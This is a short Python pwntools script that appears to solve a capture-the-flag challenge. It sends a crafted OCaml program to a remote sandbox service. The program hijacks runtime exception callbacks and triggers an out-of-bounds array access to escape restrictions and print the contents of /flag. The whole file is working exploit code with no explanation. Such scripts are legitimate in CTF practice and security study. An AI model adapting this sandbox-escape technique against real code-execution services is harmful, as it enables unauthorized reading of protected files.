#!/usr/bin/python3

from pwn import *

r = remote('sos.pwni.ng', 1337)

payload = """\
let print_flag do_open _ = print_endline (input_line (do_open "/flag"))
let oob () = Array.get (Array.make 0 0) 1

let g x _ =
    Array.set x 0 ((Array.get x 0) - 1416);
    Callback.register "Printexc.handle_uncaught_exception" print_flag;
    oob ();;

Callback.register "Pervasives.array_bound_error" do_at_exit;
Callback.register "Printexc.handle_uncaught_exception" g;
oob ()
"""

r.sendlineafter('cat <(stat -f "%z" prog.ml) prog.ml -', str(len(payload)))
sleep(0.5)
r.sendline(payload)

r.interactive()
